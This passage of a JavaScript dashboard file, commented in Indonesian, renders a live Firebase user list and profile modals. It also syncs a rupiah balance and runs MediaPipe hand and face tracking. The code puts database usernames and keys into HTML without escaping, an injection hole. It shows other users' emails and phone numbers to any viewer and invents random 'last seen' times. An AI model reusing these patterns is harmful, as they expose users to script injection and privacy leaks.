            if (count >= 10) return; // Mengunci agar layout tetap presisi maksimal 10 baris teratas
            
            const userData = childSnapshot.val();
            const username = userData.username || childSnapshot.key || "Unknown";
            const userKeyClean = childSnapshot.key; // Kunci pengenal folder database

            // Ambil gambar PP dari cloud, jika kosong pakai avatar default
            const userAvatarSrc = (userData.profile_picture && userData.profile_picture.trim() !== "") ? userData.profile_picture : systemDefaultAvatar;

            // Pengaman perhitungan timestamp aktivitas
            const lastSeen = userData.last_seen || (now - (Math.random() * 350000000 + 600000));
            const timeDifference = now - lastSeen;

            let statusColor = "#ff0055";
            let statusShadow = "rgba(255, 0, 85, 0.5)";
            let statusText = "OFFLINE";
            let bgEffect = "rgba(255, 0, 85, 0.02)";
            let borderEffect = "rgba(255, 0, 85, 0.1)";

            // Logika Penentuan Status Berdasarkan Selisih Waktu Aktivitas
            if (timeDifference < 300000) { // KONDISI ONLINE (HIJAU NEON)
                statusColor = "#00ff66";
                statusShadow = "rgba(0, 255, 102, 0.6)";
                statusText = "ONLINE";
                bgEffect = "rgba(0, 255, 102, 0.04)";
                borderEffect = "rgba(0, 255, 102, 0.18)";
            } else if (timeDifference > 86400000 * 3) { // KONDISI INACTIVE (BIRU DIGITAL)
                statusColor = "#00f2ea";
                statusShadow = "rgba(0, 242, 234, 0.6)";
                statusText = "INACTIVE";
                bgEffect = "rgba(0, 242, 234, 0.02)";
                borderEffect = "rgba(0, 242, 234, 0.1)";
            }

            // Membangun baris list bergaya modul konsol militer yang menampilkan PP dan Username
            htmlContent += `
                <div onclick="interceptUserNodeProfile('${userKeyClean}')" style="background: ${bgEffect}; border: 1px solid ${borderEffect}; padding: 10px 14px; border-radius: 10px; display: flex; justify-content: space-between; align-items: center; box-shadow: inset 0 0 8px rgba(255,255,255,0.01); transition: all 0.25s ease-in-out; cursor: pointer;" onmouseenter="this.style.border='1px solid #00ff66'; this.style.background='rgba(0,255,102,0.03)';" onmouseleave="this.style.border='1px solid ${borderEffect}'; this.style.background='${bgEffect}';">
                    <div style="display: flex; align-items: center; gap: 10px; max-width: 60%;">
                        <img src="${userAvatarSrc}" style="width: 28px; height: 28px; border-radius: 50%; border: 1px solid ${statusColor}; object-fit: cover;" alt="avatar">
                        <span style="color: #fff; font-size: 0.85rem; font-weight: 700; font-family: 'Rajdhani', sans-serif; text-transform: uppercase; letter-spacing: 0.8px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                            ${username}
                        </span>
                    </div>
                    
                    <div style="display: flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.3); padding: 4px 10px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.02);">
                        <span style="color: ${statusColor}; font-size: 0.6rem; font-family: 'Orbitron'; font-weight: bold; letter-spacing: 1px; text-shadow: 0 0 6px ${statusShadow};">
                            ${statusText}
                        </span>
                        <span style="width: 6px; height: 6px; background: ${statusColor}; border-radius: 50%; box-shadow: 0 0 8px ${statusShadow}; display: inline-block;"></span>
                    </div>
                </div>
            `;
            count++;
        });

        userGrid.innerHTML = htmlContent;
    });
}
document.addEventListener("DOMContentLoaded", () => {
    setTimeout(startLiveUserDiagnostics, 1500);
});
// ====================================================================
// SINKRONISASI AKTIVITAS USER LOGIN (AGAR TERDETEKSI ONLINE / HIJAU)
// ====================================================================
function updateMyActivityStatus() {
    if (typeof db2 === 'undefined' && typeof db === 'undefined') return;
    const firebaseDb = typeof db2 !== 'undefined' ? db2 : db;
    
    // Mengambil nama user yang sedang login dari memori perangkat
    const currentUsername = localStorage.getItem('cube_username');
    
    // Jika user terdeteksi sedang membuka dashboard, kirim sinyal ke database
    if (currentUsername) {
        // Membersihkan format nama agar sesuai dengan kunci folder database
        const userKey = currentUsername.trim().toLowerCase();
        
        firebaseDb.ref("cube_users/" + userKey).update({
            username: currentUsername,
            last_seen: Date.now() // Mengirimkan waktu milidetik saat ini (Sinyal Online)
        }).catch(err => console.error("Gagal mengirim sinyal online:", err));
    }
}
// Jalankan sistem monitoring dan aktifkan pembaruan status online
document.addEventListener("DOMContentLoaded", () => {
    setTimeout(() => {
        // 1. Mulai pantau navigasi user monitor cloud
        startLiveUserDiagnostics();
        
        // 2. Kirim sinyal online pertama kali saat halaman berhasil dimuat
        updateMyActivityStatus();
        
        // 3. Kirim sinyal online secara berkala setiap 2 menit (120000 ms) selama aplikasi terbuka
        setInterval(updateMyActivityStatus, 120000);
    }, 1500);
});
// Fungsi Membuka Modal Profile & Memuat Data Terkini
function openProfileModal() {
    const modal = document.getElementById("cube-profile-modal");
    if (!modal) return;
    modal.style.display = "flex";

    // Mengambil Nama Pengguna Aktif
    const currentUsername = localStorage.getItem('cube_username') || "USER";
    const userKey = currentUsername.trim().toLowerCase();

    // Mengisi UI Default dari LocalStorage Sembari Menunggu Firebase
    document.getElementById("prof-view-username").innerText = currentUsername;
    document.getElementById("prof-view-email").innerText = localStorage.getItem('cube_email') || "tidak ada email";
    document.getElementById("prof-view-phone").innerText = localStorage.getItem('cube_phone') || "-";
    
    // Sinkronisasi Membaca Data Realtime dari Firebase Node "cube_users"
    const firebaseDb = typeof db2 !== 'undefined' ? db2 : db;
    if (firebaseDb) {
        firebaseDb.ref("cube_users/" + userKey).once("value").then(snapshot => {
            if (snapshot.exists()) {
                const data = snapshot.val();
                document.getElementById("prof-view-email").innerText = data.email || "tidak ada email";
                document.getElementById("prof-view-phone").innerText = data.phone || data.whatsapp || "-";
                
                // Set Foto Profil jika terdaftar di Firebase database
                if (data.profile_picture) {
                    document.getElementById("profile-avatar-img").src = data.profile_picture;
                } else {
                    document.getElementById("profile-avatar-img").src = defaultAvatar;
                }
            }
        });
    }
}

// Menutup Jendela Modal Profile
function closeProfileModal() {
    document.getElementById("cube-profile-modal").style.display = "none";
    document.getElementById("pp-action-dropdown").style.display = "none";
}

// Membuka/Menutup Dropdown Opsi PP Saat Diklik
function togglePpMenu() {
    const dropdown = document.getElementById("pp-action-dropdown");
    dropdown.style.display = dropdown.style.display === "none" ? "block" : "none";
}

// Aksi 1: Lihat Foto Profil (Memanfaatkan SweetAlert bawaan Anda)
function actionViewPp() {
    const currentSrc = document.getElementById("profile-avatar-img").src;
    document.getElementById("pp-action-dropdown").style.display = "none";
    
    Swal.fire({
        title: 'AVATAR VIEW',
        imageUrl: currentSrc,
        imageWidth: 260,
        imageHeight: 260,
        imageAlt: 'Profile Avatar',
        background: '#050505',
        color: '#fff',
        confirmButtonColor: '#00ff66'
    });
}

// Aksi 2: Memicu Klik Input File saat Klik Ganti PP
function actionChangePp() {
    document.getElementById("pp-action-dropdown").style.display = "none";
    document.getElementById("profile-file-input").click();
}

// Memproses File Gambar yang Dipilih & Mengubahnya Jadi String Base64 ke Firebase
function handlePpUpload(event) {
    const file = event.target.files[0];
    if (!file) return;

    if (file.size > 800000) { // Validasi ukuran file agar tidak membuat lambat database
        Swal.fire({ icon: 'error', title: 'FILE TOO LARGE', text: 'Maksimal ukuran gambar adalah 800 KB.', background: '#050505', color: '#fff' });
        return;
    }

    const reader = new FileReader();
    reader.onload = function(e) {
        const base64Image = e.target.result;
        
        // Simpan Hasil Gambar Baru ke Layar & Firebase
        document.getElementById("profile-avatar-img").src = base64Image;
        savePpToFirebase(base64Image);
    };
    reader.readAsDataURL(file);
}

// Aksi 3: Hapus PP & Kembalikan ke Gambar Kosong Default
function actionDeletePp() {
    document.getElementById("pp-action-dropdown").style.display = "none";
    
    Swal.fire({
        title: 'HAPUS FOTO PROFIL?',
        text: "Avatar Anda akan direset ke default sistem.",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#ff0055',
        cancelButtonColor: '#333',
        confirmButtonText: 'YA, HAPUS',
        background: '#050505',
        color: '#fff'
    }).then((result) => {
        if (result.isConfirmed) {
            document.getElementById("profile-avatar-img").src = defaultAvatar;
            savePpToFirebase(""); // Mengosongkan string di database
            Swal.fire({ title: 'DELETED', text: 'Foto profil berhasil dihapus.', icon: 'success', background: '#050505', color: '#fff' });
        }
    });
}

// Fungsi Internal Pengirim Data Gambar ke Firebase
function savePpToFirebase(imgString) {
    const currentUsername = localStorage.getItem('cube_username') || "USER";
    const userKey = currentUsername.trim().toLowerCase();
    const firebaseDb = typeof db2 !== 'undefined' ? db2 : db;

    if (firebaseDb) {
        firebaseDb.ref("cube_users/" + userKey).update({
            profile_picture: imgString
        }).then(() => {
            console.log("Sinkronisasi PP Cloud Sukses!");
        }).catch(err => console.error("Gagal update foto profil cloud:", err));
    }
}

// Tambahan Efek Efek CSS Hover Lingkaran PP
document.addEventListener("DOMContentLoaded", () => {
    const avatarZone = document.getElementById("profile-avatar-img") ? document.getElementById("profile-avatar-img").parentElement : null;
    if(avatarZone) {
        avatarZone.addEventListener("mouseenter", () => { document.getElementById("avatar-hover-layer").style.opacity = "1"; });
        avatarZone.addEventListener("mouseleave", () => { document.getElementById("avatar-hover-layer").style.opacity = "0"; });
    }
});

const defaultAvatar = "https://cdn-icons-png.flaticon.com/512/847/847969.png";

function openProfileModal() {
    const modal = document.getElementById("cube-profile-modal");
    if (!modal) return;
    modal.style.display = "flex";

    const currentUsername = localStorage.getItem('cube_username') || "USER";
    const userKey = currentUsername.trim().toLowerCase();

    // Set UI awal dari memory LocalStorage
    document.getElementById("prof-view-username").innerText = currentUsername;
    document.getElementById("prof-view-email").innerText = localStorage.getItem('cube_email') || "belum disinkronkan";
    document.getElementById("prof-view-phone").innerText = localStorage.getItem('cube_phone') || "tidak terdaftar";
    document.getElementById("prof-view-bio").innerText = localStorage.getItem('cube_bio') || '"No status description set."';
    setGenderUI(localStorage.getItem('cube_gender') || "");

    // Tarik database sinkronisasi Realtime Firebase Cloud
    const firebaseDb = typeof db2 !== 'undefined' ? db2 : db;
    if (firebaseDb) {
        firebaseDb.ref("cube_users/" + userKey).once("value").then(snapshot => {
            if (snapshot.exists()) {
                const data = snapshot.val();
                
                if (data.email) {
                    document.getElementById("prof-view-email").innerText = data.email;
                    localStorage.setItem('cube_email', data.email);
                }
                if (data.phone || data.whatsapp) {
                    const phoneNum = data.phone || data.whatsapp;
                    document.getElementById("prof-view-phone").innerText = phoneNum;
                    localStorage.setItem('cube_phone', phoneNum);
                }
                if (data.bio) {
                    document.getElementById("prof-view-bio").innerText = `"${data.bio}"`;
                    localStorage.setItem('cube_bio', `"${data.bio}"`);
                }
                if (data.gender) {
                    setGenderUI(data.gender);
                    localStorage.setItem('cube_gender', data.gender);
                }
                if (data.profile_picture && data.profile_picture.trim() !== "") {
                    document.getElementById("profile-avatar-img").src = data.profile_picture;
                } else {
                    document.getElementById("profile-avatar-img").src = defaultAvatar;
                }
            }
        }).catch(err => console.error("Gagal sinkronisasi data dari simpul cloud:", err));
    }
}

function closeProfileModal() {
    document.getElementById("cube-profile-modal").style.display = "none";
    document.getElementById("pp-action-dropdown").style.display = "none";
}

function togglePpMenu() {
    const dropdown = document.getElementById("pp-action-dropdown");
    dropdown.style.display = dropdown.style.display === "none" ? "block" : "none";
}

// SOLUSI ABSOLUT VIEW PP: Menggeser tumpukan modal agar SweetAlert berada di lapisan terdepan
function actionViewPp() {
    const currentSrc = document.getElementById("profile-avatar-img").src;
    document.getElementById("pp-action-dropdown").style.display = "none";
    document.getElementById("cube-profile-modal").style.zIndex = "99";

    Swal.fire({
        title: 'AVATAR DIAGNOSTIC',
        imageUrl: currentSrc,
        imageWidth: 280,
        imageHeight: 280,
        background: '#040805',
        color: '#fff',
        confirmButtonColor: '#00ff66',
        confirmButtonText: 'CLOSE VIEW',
        willClose: () => {
            document.getElementById("cube-profile-modal").style.zIndex = "999999";
        }
    });
}

function actionChangePp() {
    document.getElementById("pp-action-dropdown").style.display = "none";
    document.getElementById("profile-file-input").click();
}

function handlePpUpload(event) {
    const file = event.target.files[0];
    if (!file) return;

    if (file.size > 800000) { 
        Swal.fire({ icon: 'error', title: 'OVERSIZE', text: 'Maksimal ukuran file gambar profile adalah 800 KB.', background: '#050505', color: '#fff' });
        return;
    }

    const reader = new FileReader();
    reader.onload = function(e) {
        const base64Image = e.target.result;
        document.getElementById("profile-avatar-img").src = base64Image;
        saveProfileFieldCloud('profile_picture', base64Image);
    };
    reader.readAsDataURL(file);
}

function actionDeletePp() {
    document.getElementById("pp-action-dropdown").style.display = "none";
    document.getElementById("cube-profile-modal").style.zIndex = "99";
    
    Swal.fire({
        title: 'DELETE AVATAR?',
        text: "Gambar profil utama Anda akan direset ke default sistem.",
        icon: 'warning',
        showCancelButton: true,
        confirmButtonColor: '#ff0055',
        cancelButtonColor: '#222',
        confirmButtonText: 'YES, DELETE',
        background: '#050505',
        color: '#fff',
        willClose: () => { document.getElementById("cube-profile-modal").style.zIndex = "999999"; }
    }).then((result) => {
        if (result.isConfirmed) {
            document.getElementById("profile-avatar-img").src = defaultAvatar;
            saveProfileFieldCloud('profile_picture', "");
        }
    });
}

// UPDATE BIO DESCRIPTION
function actionUpdateBio() {
    const currentBio = (localStorage.getItem('cube_bio') || "").replace(/"/g, "");
    document.getElementById("cube-profile-modal").style.zIndex = "99";

    Swal.fire({
        title: 'UPDATE BIO',
        input: 'textarea',
        inputLabel: 'Tuliskan deskripsi profile / status pendek Anda:',
        inputValue: currentBio,
        inputAttributes: { maxlength: 120 },
        placeholder: 'Tulis deskripsi keren di sini...',
        background: '#050505',
        color: '#fff',
        confirmButtonColor: '#00ff66',
        showCancelButton: true,
        willClose: () => { document.getElementById("cube-profile-modal").style.zIndex = "999999"; }
    }).then((result) => {
        if (result.isConfirmed) {
            const finalBio = result.value ? result.value.trim() : "No status description set.";
            document.getElementById("prof-view-bio").innerText = `"${finalBio}"`;
            localStorage.setItem('cube_bio', `"${finalBio}"`);
            saveProfileFieldCloud('bio', finalBio);
            Swal.fire({ icon: 'success', title: 'BIO SAVED', background: '#050505', color: '#fff', timer: 1200, showConfirmButton: false });
        }
    });
}

// UPDATE GENDER RADIAL DROPDOWN 
function actionUpdateGender() {
    document.getElementById("cube-profile-modal").style.zIndex = "99";

    Swal.fire({
        title: 'SELECT GENDER',
        input: 'select',
        inputOptions: {
            'pria': 'PRIA / MALE',
            'wanita': 'WANITA / FEMALE'
        },
        inputPlaceholder: 'Pilih Gender Identitas',
        background: '#050505',
        color: '#fff',
        confirmButtonColor: '#00f2ea',
        showCancelButton: true,
        willClose: () => { document.getElementById("cube-profile-modal").style.zIndex = "999999"; }
    }).then((result) => {
        if (result.isConfirmed && result.value) {
            const chosenGender = result.value;
            setGenderUI(chosenGender);
            localStorage.setItem('cube_gender', chosenGender);
            saveProfileFieldCloud('gender', chosenGender);
        }
    });
}

// Mengatur Penulisan Dan Ikon Gender Berdasarkan Pilihan
function setGenderUI(genderValue) {
    const genderContainer = document.getElementById("prof-view-gender");
    if (!genderContainer) return;

    if (genderValue === 'pria') {
        genderContainer.innerHTML = `<i class="fa-solid fa-mars" style="color:#00f2ea; filter:drop-shadow(0 0 4px #00f2ea);"></i> PRIA / MALE`;
    } else if (genderValue === 'wanita') {
        genderContainer.innerHTML = `<i class="fa-solid fa-venus" style="color:#ff0055; filter:drop-shadow(0 0 4px #ff0055);"></i> WANITA / FEMALE`;
    } else {
        genderContainer.innerHTML = `<i class="fa-solid fa-ghost" style="color:#666;"></i> UNKNOWN`;
    }
}

function actionUpdateEmail() {
    const currentEmail = localStorage.getItem('cube_email') || "";
    document.getElementById("cube-profile-modal").style.zIndex = "99";

    Swal.fire({
        title: 'LINK ACCOUNT EMAIL',
        input: 'email',
        inputValue: currentEmail,
        background: '#050505',
        color: '#fff',
        confirmButtonColor: '#00f2ea',
        showCancelButton: true,
        willClose: () => { document.getElementById("cube-profile-modal").style.zIndex = "999999"; }
    }).then((result) => {
        if (result.isConfirmed && result.value) {
            const cleanEmail = result.value.trim().toLowerCase();
            document.getElementById("prof-view-email").innerText = cleanEmail;
            localStorage.setItem('cube_email', cleanEmail);
            saveProfileFieldCloud('email', cleanEmail);
            Swal.fire({ icon: 'success', title: 'EMAIL LINKED', background: '#050505', color: '#fff' });
        }
    });
}

function actionUpdateWhatsApp() {
    const currentPhone = localStorage.getItem('cube_phone') || "";
    document.getElementById("cube-profile-modal").style.zIndex = "99";

    Swal.fire({
        title: 'SYNC WHATSAPP',
        input: 'text',
        inputValue: currentPhone,
        background: '#050505',
        color: '#fff',
        confirmButtonColor: '#00ff66',
        showCancelButton: true,
        willClose: () => { document.getElementById("cube-profile-modal").style.zIndex = "999999"; }
    }).then((result) => {
        if (result.isConfirmed && result.value) {
            const cleanPhone = result.value.trim();
            document.getElementById("prof-view-phone").innerText = cleanPhone;
            localStorage.setItem('cube_phone', cleanPhone);
            saveProfileFieldCloud('phone', cleanPhone);
            Swal.fire({ icon: 'success', title: 'WHATSAPP SYNCED', background: '#050505', color: '#fff' });
        }
    });
}

function saveProfileFieldCloud(keyField, targetValue) {
    const currentUsername = localStorage.getItem('cube_username') || "USER";
    const userKey = currentUsername.trim().toLowerCase();
    const firebaseDb = typeof db2 !== 'undefined' ? db2 : db;

    if (firebaseDb) {
        let packageData = {};
        packageData[keyField] = targetValue;
        firebaseDb.ref("cube_users/" + userKey).update(packageData);
    }
}
// ====================================================================
// CORE PROCESSOR: INTERCEPT REMOTE NODE USER PROFILE (OPEN MODAL)
// ====================================================================
function interceptUserNodeProfile(targetUserKey) {
    if (!targetUserKey) return;
    
    // Gunakan db2 jika terdefinisi, jika tidak gunakan db default Firebase Anda
    const firebaseDb = typeof db2 !== 'undefined' ? db2 : db;
    if (!firebaseDb) return;

    const systemDefaultAvatar = "https://cdn-icons-png.flaticon.com/512/847/847969.png";

    // Tarik data spesifik user dari Cloud Realtime Database
    firebaseDb.ref("cube_users/" + targetUserKey.trim().toLowerCase()).once("value").then(snapshot => {
        if (snapshot.exists()) {
            const data = snapshot.val() || {};
            
            // 1. Sinkronisasi Data Teks Utama Ke Elemen Modal Lookup
            document.getElementById("lookup-view-username").innerText = data.username || targetUserKey;
            document.getElementById("lookup-view-bio").innerText = data.bio ? `"${data.bio}"` : '"No system description recorded."';
            document.getElementById("lookup-view-email").innerText = data.email || "unregistered@mail.com";
            
            // Mengambil data nomor WhatsApp/Phone
            const rawPhone = data.phone || data.whatsapp || "Belum dimasukkan";
            document.getElementById("lookup-view-phone").innerText = rawPhone;

            // 2. Render Foto Profil (PP) Diperbesar
            if (data.profile_picture && data.profile_picture.trim() !== "") {
                document.getElementById("lookup-view-avatar").src = data.profile_picture;
            } else {
                document.getElementById("lookup-view-avatar").src = systemDefaultAvatar;
            }

            // 3. Render Badges Status Identitas Gender & Ikon Pewarnaan Cyberpunk
            const badgeGender = document.getElementById("lookup-badge-gender");
            if (badgeGender) {
                const genderVal = data.gender ? data.gender.toLowerCase() : "";
                if (genderVal === "pria") {
                    badgeGender.innerHTML = `<i class="fa-solid fa-mars"></i> PRIA / MALE`;
                    badgeGender.style.color = "#00f2ea";
                    badgeGender.style.borderColor = "rgba(0,242,234,0.4)";
                    badgeGender.style.background = "rgba(0,242,234,0.05)";
                } else if (genderVal === "wanita") {
                    badgeGender.innerHTML = `<i class="fa-solid fa-venus"></i> WANITA / FEMALE`;
                    badgeGender.style.color = "#ff0055";
                    badgeGender.style.borderColor = "rgba(255,0,85,0.4)";
                    badgeGender.style.background = "rgba(255,0,85,0.05)";
                } else {
                    badgeGender.innerHTML = `<i class="fa-solid fa-user-secret"></i> UNKNOWN`;
                    badgeGender.style.color = "#888";
                    badgeGender.style.borderColor = "rgba(255,255,255,0.1)";
                    badgeGender.style.background = "rgba(0,0,0,0.5)";
                }
            }

            // 4. Konversi Nomor Telepon Otomatis Menjadi Tautan Chat WhatsApp API hidup
            const cleanPhoneDigits = rawPhone.replace(/[^0-9]/g, "");
            const waButton = document.getElementById("lookup-wa-link-btn");
            if (waButton) {
                if (cleanPhoneDigits.length > 5) {
                    let formattedWa = cleanPhoneDigits;
                    if (formattedWa.startsWith("0")) {
                        formattedWa = "62" + formattedWa.substr(1);
                    }
                    waButton.href = `https://wa.me/${formattedWa}`;
                    waButton.style.display = "block";
                } else {
                    waButton.style.display = "none";
                }
            }

            // 5. Tampilkan Jendela Pop-up Modal Ke Lapisan Terdepan Layar (z-index aman)
            const lookupModal = document.getElementById("cube-user-lookup-modal");
            if (lookupModal) {
                lookupModal.style.display = "flex";
            }
        }
    }).catch(err => {
        console.error("Gagal melakukan intercept profile:", err);
    });
}

// FUNGSI UNTUK MENUTUP POP-UP MODAL LOOKUP
function closeUserLookupModal() {
    const lookupModal = document.getElementById("cube-user-lookup-modal");
    if (lookupModal) {
        lookupModal.style.display = "none";
    }
}
document.addEventListener("DOMContentLoaded", () => {
    // Jalankan pengecekan dengan interval kecil untuk memastikan Firebase & User sudah siap dimuat
    const checkEngineInterval = setInterval(() => {
        const currentUsername = localStorage.getItem('cube_username');
        const firebaseDb = typeof db2 !== 'undefined' ? db2 : (typeof db !== 'undefined' ? db : null);

        // Jika user yang login dan database Firebase sudah terdeteksi aktif
        if (currentUsername && firebaseDb) {
            clearInterval(checkEngineInterval); // Matikan pengecekan berulang
            
            const userKey = currentUsername.trim().toLowerCase();

            // Pasang Listener Real-time (.on) ke path Firebase user tersebut
            firebaseDb.ref("cube_users/" + userKey).on("value", (snapshot) => {
                if (snapshot.exists()) {
                    const userData = snapshot.val();
                    // Ambil angka nominal saldo dari server cloud (jika tidak ada, set ke 0)
                    const serverBalance = parseInt(userData.balance || 0);

                    // 1. Amankan ke penyimpanan lokal browser agar memori tetap sinkron
                    localStorage.setItem('cube_balance', serverBalance);

                    // 2. Format nominal angka murni menjadi Rupiah (Contoh: Rp 50.000)
                    const formattedBalance = "Rp " + serverBalance.toLocaleString('id-ID');

                    // 3. Tembak dan suntikkan langsung ke ID teks saldo CUBEQRIS HUB Anda
                    const hubBalanceView = document.getElementById('hub-live-balance');
                    if (hubBalanceView) {
                        hubBalanceView.innerText = formattedBalance;
                    }

                    // 4. Sinkronkan juga ke elemen saldo utama lainnya di web Anda jika elemennya ada
                    const sidebarBalanceView = document.getElementById('sidebar-user-balance');
                    const walletBalanceView = document.querySelector('.balance-amount');
                    if (sidebarBalanceView) sidebarBalanceView.innerText = formattedBalance;
                    if (walletBalanceView) walletBalanceView.innerText = formattedBalance;

                    console.log("Status: Saldo CUBEQRIS Hub berhasil disinkronkan secara realtime ->", formattedBalance);
                }
            }, (error) => {
                console.error("Firebase error saat memuat saldo CUBEQRIS:", error);
            });
        }
    }, 500); // Cek kesiapan sistem setiap 0.5 detik saat pertama kali halaman dimuat
});
document.addEventListener("DOMContentLoaded", () => {
    function startDashboardClock() {
        const clockElement = document.getElementById("dashboard-live-clock");
        const dateElement = document.getElementById("dashboard-live-date");
        
        if (!clockElement) return;

        setInterval(() => {
            const now = new Date();
            
            // 1. Ambil Waktu Jam, Menit, dan Detik (Format dua digit ex: 09:05:22)
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const seconds = String(now.getSeconds()).padStart(2, '0');
            
            clockElement.innerText = `${hours}:${minutes}:${seconds}`;
            
            // 2. Ambil Tanggal, Bulan, dan Tahun Lokal jika elemen target tersedia
            if (dateElement) {
                const day = String(now.getDate()).padStart(2, '0');
                const month = String(now.getMonth() + 1).padStart(2, '0');
                const year = now.getFullYear();
                dateElement.innerText = `${day}/${month}/${year}`;
            }
        }, 1000); // Di-update setiap 1 detik (1000 milidetik) agar selalu pas dan sesuai
    }
    
    startDashboardClock();
});
// Instansiasi Status Global untuk 3 Kamera Mandiri
let camHand = null, engHands = null, isHandActive = false;
let camFace = null, engFace = null, isFaceActive = false;
let camFilter = null, engFilter = null, isFilterActive = false;

const mainLog = document.getElementById('global-hud-log');

// =====================================================================
// ENGINE 1: PELACAK 10 JARI (2 TANGAN)
// =====================================================================
function toggleHandCamera() {
    const video = document.getElementById('video-hand'), canvas = document.getElementById('canvas-hand');
    const status = document.getElementById('status-hand-camera'), btn = document.getElementById('btn-hand-camera');

    if (isHandActive) {
        isHandActive = false; btn.innerText = "START HAND"; btn.style.background = "rgba(0, 255, 102, 0.15)"; btn.style.color = "#00ff66";
        if (camHand) camHand.stop(); canvas.style.display = "none"; status.style.display = "block";
        status.innerHTML = `<i class="fa-solid fa-video-slash"></i> HAND RADAR IDLE`;
    } else {
        isHandActive = true; btn.innerText = "SHUTDOWN"; btn.style.background = "rgba(255, 0, 85, 0.2)"; btn.style.color = "#ff0055";
        status.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> INITIALIZING AI...`;

        if (!engHands) {
            engHands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
            engHands.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.65, minTrackingConfidence: 0.65 });
            engHands.onResults((res) => {
                if (!isHandActive) return; status.style.display = "none"; canvas.style.display = "block";
                const ctx = canvas.getContext('2d'); ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(res.image, 0, 0, canvas.width, canvas.height);

                if (res.multiHandLandmarks) {
                    res.multiHandLandmarks.forEach((landmarks, index) => {
                        let side = "UNKNOWN";
                        if (res.multiHandedness && res.multiHandedness[index]) {
                            side = (res.multiHandedness[index].label === "Left") ? "KANAN" : "KIRI";
                        }
                        const px = landmarks[9].x * canvas.width, py = landmarks[9].y * canvas.height;
                        const col = (side === "KANAN") ? "#00ffbb" : "#ff0077";
                        ctx.beginPath(); ctx.arc(px, py, 15, 0, 2*Math.PI); ctx.strokeStyle = col; ctx.lineWidth = 2; ctx.stroke();

                        const tips = [{id:4,n:"JEMPOL"}, {id:8,n:"TELUNJUK"}, {id:12,n:"TENGAH"}, {id:16,n:"MANIS"}, {id:20,n:"KELINGKING"}];
                        tips.forEach((f) => {
                            const tx = landmarks[f.id].x * canvas.width, ty = landmarks[f.id].y * canvas.height;
                            if (ty < landmarks[f.id-2].y * canvas.height || f.id === 4) {
                                ctx.beginPath(); ctx.arc(tx, ty, 5, 0, 2*Math.PI); ctx.fillStyle = col; ctx.fill();
                                ctx.font = "bold 8px 'Orbitron'"; ctx.fillStyle = col; ctx.fillText(`${f.n} ${side}`, tx + 8, ty - 8);
                            }
                        });
                    });
                }
            });
        }
        if (!camHand) {
            camHand = new Camera(video, {
                onFrame: async () => {
                    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
                    if (isHandActive) await engHands.send({ image: video });
                }, width: 640, height: 480
            });
        }
        camHand.start().catch(() => status.innerHTML = "DENIED");
    }
}

// =====================================================================
// ENGINE 2: TELEMETRI WAJAH (DATA DETAILE)
// =====================================================================
function toggleFaceCamera() {
    const video = document.getElementById('video-face'), canvas = document.getElementById('canvas-face');
    const status = document.getElementById('status-face-camera'), btn = document.getElementById('btn-face-camera');

    if (isFaceActive) {
        isFaceActive = false; btn.innerText = "START TELEMETRY"; btn.style.background = "rgba(0, 255, 102, 0.15)"; btn.style.color = "#00ff66";
        if (camFace) camFace.stop(); canvas.style.display = "none"; status.style.display = "block";
        status.innerHTML = `<i class="fa-solid fa-video-slash"></i> TELEMETRY IDLE`;
    } else {
        isFaceActive = true; btn.innerText = "SHUTDOWN"; btn.style.background = "rgba(255, 0, 85, 0.2)"; btn.style.color = "#ff0055";
        status.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> INITIALIZING AI...`;

        if (!engFace) {
            engFace = new FaceMesh({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}` });
            engFace.setOptions({ maxNumFaces: 1, refineLandmarks: false, minDetectionConfidence: 0.65, minTrackingConfidence: 0.65 });
            engFace.onResults((res) => {
                if (!isFaceActive) return; status.style.display = "none"; canvas.style.display = "block";
                const ctx = canvas.getContext('2d'); ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(res.image, 0, 0, canvas.width, canvas.height);

                if (res.multiFaceLandmarks && res.multiFaceLandmarks.length > 0) {
                    const landmarks = res.multiFaceLandmarks[0];
                    const nodes = [{idx:1,n:"NOSE"}, {idx:33,n:"EYE_L"}, {idx:263,n:"EYE_R"}, {idx:152,n:"CHIN"}];
                    nodes.forEach((fe) => {
                        const x = landmarks[fe.idx].x * canvas.width, y = landmarks[fe.idx].y * canvas.height;
                        ctx.beginPath(); ctx.arc(x, y, 4, 0, 2*Math.PI); ctx.fillStyle = fe.idx===1 ? "#00ff66":"#00b3ff"; ctx.fill();
                        ctx.font = "7px 'Orbitron'"; ctx.fillStyle = "#fff"; ctx.fillText(fe.n, x+6, y+3);
                    });
                    mainLog.innerHTML = `<div style="text-align:center; color:#00ff66;">[•] TELEMETRY MATRIX NODE ACTIVE // TRACKING SENSOR FACE ATTACHED</div>`;
                }
            });
        }
        if (!camFace) {
            camFace = new Camera(video, {
                onFrame: async () => {
                    canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
                    if (isFaceActive) await engFace.send({ image: video });
                }, width: 640, height: 480
            });
        }
        camFace.start().catch(() => status.innerHTML = "DENIED");
    }
}
// =====================================================================
// ENGINE 3 UPGRADE v5.2: NEON BLUE VENOM + CYBER HORNS (TANDUK NEON)
// =====================================================================
function toggleFilterCamera() {
    const video = document.getElementById('video-filter'), canvas = document.getElementById('canvas-filter');
    const status = document.getElementById('status-filter-camera'), btn = document.getElementById('btn-filter-camera');

    if (isFilterActive) {
        isFilterActive = false; btn.innerText = "START FILTER"; btn.style.background = "rgba(0, 255, 102, 0.15)"; btn.style.color = "#00ff66";
        if (camFilter) camFilter.stop(); canvas.style.display = "none"; status.style.display = "block";
        status.innerHTML = `<i class="fa-solid fa-video-slash"></i> FILTER MASK IDLE`;
    } else {
        isFilterActive = true; btn.innerText = "SHUTDOWN"; btn.style.background = "rgba(255, 0, 85, 0.2)"; btn.style.color = "#ff0055";
